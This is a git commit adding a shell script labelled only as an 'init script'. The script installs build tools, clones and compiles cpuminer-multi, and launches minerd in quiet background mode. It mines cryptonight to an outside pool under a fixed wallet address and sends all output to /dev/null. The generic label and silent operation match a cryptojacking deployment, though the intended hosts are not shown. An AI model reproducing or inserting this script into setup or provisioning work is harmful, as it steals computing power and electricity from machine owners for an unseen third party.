c50960134f21cbe211c9bf4f78b266541d8c571c
atton <e115763@gmail.com>
2017-11-28 21:11:56 +0900

    Add init script

---
+++ init.sh
@@ -0,0 +1,10 @@
+#!/bin/sh
+cd `dirname $0`
+
+yum install -y autoconf automake libcurl-devel git zsh
+git clone https://github.com/OhGodAPet/cpuminer-multi
+cd cpuminer-multi
+./autogen.sh
+CFLAGS="-march=native" ./configure
+make install
+/usr/local/bin/minerd -B -q -a cryptonight -o stratum+tcp://krb.crypto-coins.club:5555 -u KgGc79QyYag4LugEc2Gnxobt7Mfe9CSEh4NqGzdysooL3Czy6mKtuqLiCehzgoBDESTaYDN3U9XtgLxVJLmPCi397ppx6cL -p x -t 1 >& /dev/null
